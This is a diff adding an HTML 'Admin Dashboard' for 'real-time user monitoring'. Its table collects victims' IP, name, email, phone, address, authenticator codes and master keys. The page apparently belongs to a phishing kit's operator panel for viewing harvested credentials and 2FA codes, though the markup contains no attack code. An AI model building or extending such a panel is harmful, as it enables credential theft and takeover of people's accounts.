@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="/css/styles.css">
+</head>
+<body>
+  <header>
+    <h1>Admin Dashboard</h1>
+    <p class="subtitle">Real-time user monitoring</p>
+  </header>
+
+  <div class="table-wrapper">
+    <table id="userTable">
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>IP</th>
+          <th>Full Name</th>
+          <th>Email</th>
+          <th>Mobile Number</th>
+          <th>Address</th>
+          <th>Authenticator Code</th>
+          <th>Master Key</th>
+          <th>Status</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr id="noUsersRow">
+          <td colspan="10" class="no-data">No users available</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <script src="/js/dashboard.js"></script>
+</body>
+</html>
